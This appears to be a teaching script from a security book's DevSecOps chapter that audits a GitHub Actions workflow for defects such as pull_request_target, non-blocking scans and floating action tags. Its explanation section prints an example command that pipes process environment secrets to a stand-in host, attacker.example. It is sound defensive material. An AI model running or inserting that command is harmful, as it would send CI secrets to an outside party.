#!/usr/bin/env bash
#
# Chapter 30 — Auditing a CI workflow for security defects
#
# Diff a workflow file (default: vulnerable/.github/workflows/ci.yml)
# against the fixed counterpart and call out each red flag.

set -euo pipefail
REPO=${REPO:-/Users/e141057/Desktop/work/clade_play_area/security-book-code}
TARGET="${1:-$REPO/chapters/30-devsecops/vulnerable/.github/workflows/ci.yml}"

bold() { printf '\033[1m%s\033[0m\n' "$*"; }

bold "[1/4] Auditing $TARGET"
echo

PROBLEMS=()

if grep -q '^on:.*pull_request_target\|^\s*pull_request_target:' "$TARGET"; then
  PROBLEMS+=("pull_request_target — fork PRs run WITH base-branch secrets")
fi

if grep -qE 'continue-on-error:\s*true' "$TARGET"; then
  PROBLEMS+=("continue-on-error: true — security scans report but don't block")
fi

if grep -qE 'uses:.+@(master|main)\b' "$TARGET"; then
  HITS=$(grep -E 'uses:.+@(master|main)\b' "$TARGET")
  PROBLEMS+=("action(s) pinned to a floating branch:")
  while IFS= read -r line; do PROBLEMS+=("    $line"); done <<<"$HITS"
fi

if grep -qE '^\s*permissions:\s*$' "$TARGET" && grep -qE '^\s*(contents|packages|id-token):\s*write' "$TARGET"; then
  if ! awk '/^\s*permissions:/{p=1; next} p && /^\s*[^[:space:]-]/{p=0} p' "$TARGET" | grep -q 'read'; then
    PROBLEMS+=("permissions overly broad — no read scopes, only writes")
  fi
fi

if grep -qE '(NPM_TOKEN|AWS_SECRET|DOCKER_PASSWORD).*\$\{\{\s*secrets\.' "$TARGET"; then
  if ! grep -qE 'environment:\s*[a-z]' "$TARGET"; then
    PROBLEMS+=("publish-grade secrets injected without an environment approval gate")
  fi
fi

bold "[2/4] Findings"
if [ ${#PROBLEMS[@]} -eq 0 ]; then
  echo "  No defects detected."
  exit 0
fi
for p in "${PROBLEMS[@]}"; do echo "  ✗ $p"; done
echo

bold "[3/4] What an attacker does with each"
cat <<'EOF'
  pull_request_target:
    Open a fork PR whose code contains:
      `cat /proc/self/environ | curl --data-binary @- attacker.example`
    Every secret in the workflow's env reaches attacker.example.

  continue-on-error: true:
    Push code with a known-vulnerable transitive dep. The SCA step
    fires, posts an annotation, then the workflow goes green and the
    PR auto-merges.

  Floating @master tag:
    Wait for upstream maintainer compromise. The next CI run on every
    consumer pulls the backdoored action — instant supply-chain breach.
EOF
echo

bold "[4/4] The fix"
echo "  See chapters/30-devsecops/fixed/.github/workflows/ci.yml for a"
echo "  workflow that pins versions, uses pull_request, and treats every"
echo "  scan as a hard gate."
exit 1
